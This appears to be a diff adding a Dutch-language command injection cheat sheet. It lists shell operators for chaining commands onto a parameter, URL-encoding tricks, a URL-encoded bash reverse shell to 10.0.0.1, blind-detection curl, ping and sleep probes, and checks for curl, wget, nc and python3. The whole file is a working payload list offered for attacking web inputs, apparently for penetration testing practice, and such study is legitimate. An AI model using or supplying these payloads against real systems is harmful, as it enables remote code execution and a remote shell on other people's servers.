@@ -1,0 +1,34 @@
+# Command Injection - Operatoren en Payloads
+# === Injection operatoren ===
+# Semicolon (commando scheiden):
+127.0.0.1;id
+# Pipe (output doorsturen):
+127.0.0.1|id
+# AND (beide uitvoeren als eerste slaagt):
+127.0.0.1&&id
+# OR (tweede uitvoeren als eerste faalt):
+foobar||id
+# Backtick (inline substitutie):
+`id`
+# Dollar (inline substitutie):
+$(id)
+# Newline (URL-encoded):
+127.0.0.1%0aid
+# === URL-encoding voor speciale tekens ===
+# & -> %26 (nodig in URL parameters)
+# | -> %7c
+# ; -> %3b
+# Spatie -> + of %20
+# === Reverse shell via command injection ===
+;bash -c 'bash -i >%26 /dev/tcp/10.0.0.1/443 0>%261'
+# Let op: & moet URL-encoded als %26 in HTTP requests
+# === Blind detection ===
+;curl http://10.0.0.1/cmdi_confirm
+;ping -c 1 10.0.0.1
+;sleep 5
+# === Capability check (welke tools beschikbaar) ===
+;which curl
+;which wget
+;which nc
+;which python3
+# Tip: Probeer alle operatoren systematisch als 1 niet werkt
